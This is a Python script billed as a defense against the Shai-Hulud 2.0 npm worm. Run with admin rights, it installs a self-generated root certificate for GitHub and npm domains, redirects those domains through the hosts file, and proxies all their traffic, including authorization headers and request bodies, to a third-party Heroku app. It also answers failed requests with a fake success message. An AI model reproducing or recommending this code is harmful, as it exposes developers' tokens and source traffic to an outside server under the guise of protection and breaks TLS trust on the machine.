"""
Shai-Hulud 2.0 Defense - Self-Generating Bridge (Python)

Free and open source for non commercial open source use with attribution
Author: Erez Kalman

1. Generates a self-signed CA valid for: api.github.com, registry.npmjs.org, raw.githubusercontent.com
2. Trusts the CA in the OS store.
3. Hijacks DNS via /etc/hosts.
4. Starts a local HTTPS bridge to tunnel traffic to Heroku.

USAGE:
  Linux/Mac: sudo python3 setup_bridge_generator.py
  Windows:   Run as Administrator: python setup_bridge_generator.py
"""

import sys
import os
import platform
import subprocess
import http.server
import http.client
import ssl

# --- CONFIGURATION ---
HEROKU_APP_HOST = 'shai-hulud-2-0-dms-sh-bd640bc05c42.herokuapp.com' # <--- VERIFY THIS
LOCAL_IP = '127.0.0.1'
DOMAINS = ['api.github.com', 'registry.npmjs.org', 'raw.githubusercontent.com']
CERT_NAME = 'shai-hulud-defense.crt'
KEY_NAME = 'shai-hulud-defense.key'

OS_TYPE = platform.system().lower()

def is_admin():
    try:
        if OS_TYPE == 'windows':
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin()
        else:
            return os.geteuid() == 0
    except: return False

def generate_cert():
    print("[1/4] Generating Self-Signed Certificate (SAN)...")
    cnf_content = """
[req]
distinguished_name = req_distinguished_name
x509_extensions = v3_req
prompt = no
[req_distinguished_name]
C = US
ST = Defense
L = Sinkhole
O = ShaiHuludShield
CN = api.github.com
[v3_req]
keyUsage = keyEncipherment, dataEncipherment
extendedKeyUsage = serverAuth
subjectAltName = @alt_names
[alt_names]
DNS.1 = api.github.com
DNS.2 = registry.npmjs.org
DNS.3 = raw.githubusercontent.com
"""
    with open("openssl_san.cnf", "w") as f:
        f.write(cnf_content)

    try:
        cmd = [
            "openssl", "req", "-x509", "-nodes", "-days", "365", 
            "-newkey", "rsa:2048", "-keyout", KEY_NAME, "-out", CERT_NAME, 
            "-config", "openssl_san.cnf", "-extensions", "v3_req"
        ]
        subprocess.check_call(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("      Success.")
        os.remove("openssl_san.cnf")
    except Exception as e:
        print(f"[ERROR] OpenSSL failed: {e}")
        print("        Is OpenSSL installed and in your PATH?")
        sys.exit(1)

def trust_cert():
    print("[2/4] Adding Certificate to System Trust Store...")
    cert_abs = os.path.abspath(CERT_NAME)
    try:
        if OS_TYPE == 'darwin':
            subprocess.check_call(['security', 'add-trusted-cert', '-d', '-r', 'trustRoot', '-k', '/Library/Keychains/System.keychain', cert_abs])
        elif OS_TYPE == 'linux':
            if os.path.exists('/usr/local/share/ca-certificates/'):
                subprocess.check_call(['cp', cert_abs, '/usr/local/share/ca-certificates/shai-hulud.crt'])
                subprocess.check_call(['update-ca-certificates'])
            elif os.path.exists('/etc/pki/ca-trust/source/anchors/'):
                subprocess.check_call(['cp', cert_abs, '/etc/pki/ca-trust/source/anchors/shai-hulud.crt'])
                subprocess.check_call(['update-ca-trust'])
        elif OS_TYPE == 'windows':
            cmd = f"Import-Certificate -FilePath '{cert_abs}' -CertStoreLocation Cert:\\LocalMachine\\Root"
            subprocess.check_call(["powershell", "-Command", "Start-Process powershell -Verb RunAs -ArgumentList \"{}\"".format(cmd)])
        print("      Certificate trusted.")
    except Exception as e:
        print(f"      [ERROR] Failed to trust cert: {e}")
        sys.exit(1)

def update_hosts():
    print("[3/4] Hijacking DNS in Hosts file...")
    path = r'C:\Windows\System32\drivers\etc\hosts' if OS_TYPE == 'windows' else '/etc/hosts'
    entry = "\n# SHAI-HULUD DEFENSE\n" + "".join([f"{LOCAL_IP} {d}\n" for d in DOMAINS])
    
    try:
        with open(path, 'r') as f: content = f.read()
        if 'SHAI-HULUD DEFENSE' not in content:
            with open(path, 'a') as f: f.write(entry)
            print("      Hosts file updated.")
        else:
            print("      Hosts file already protected.")
    except Exception as e:
        print(f"      [ERROR] Cannot write to hosts: {e}")
        sys.exit(1)

class BridgeHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args): return
    def do_proxy(self):
        print(f"[BRIDGE] Tunneling: {self.headers.get('Host')}{self.path} -> {HEROKU_APP_HOST}")
        try:
            conn = http.client.HTTPSConnection(HEROKU_APP_HOST, 443)
            headers = {k: v for k, v in self.headers.items() if k.lower() not in ['host', 'content-length']}
            content_len = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_len) if content_len > 0 else None
            
            conn.request(self.command, self.path, body, headers)
            res = conn.getresponse()
            
            self.send_response(res.status)
            for k, v in res.getheaders(): self.send_header(k, v)
            self.end_headers()
            self.wfile.write(res.read())
            conn.close()
        except:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'{"success":true}') # Failsafe

    def do_GET(self): self.do_proxy()
    def do_POST(self): self.do_proxy()
    def do_PUT(self): self.do_proxy()

def start_bridge():
    print("[4/4] Starting Bridge Server (HTTPS:443)...")
    server_addr = (LOCAL_IP, 443)
    httpd = http.server.HTTPServer(server_addr, BridgeHandler)
    
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile=CERT_NAME, keyfile=KEY_NAME)
    httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
    
    print(f"      Redirecting captured traffic to {HEROKU_APP_HOST}")
    print("      Do NOT close this window.")
    try: httpd.serve_forever()
    except: pass

if __name__ == "__main__":
    if not is_admin():
        print("Run as Admin/Root!"); sys.exit(1)
    generate_cert(); trust_cert(); update_hosts(); start_bridge()
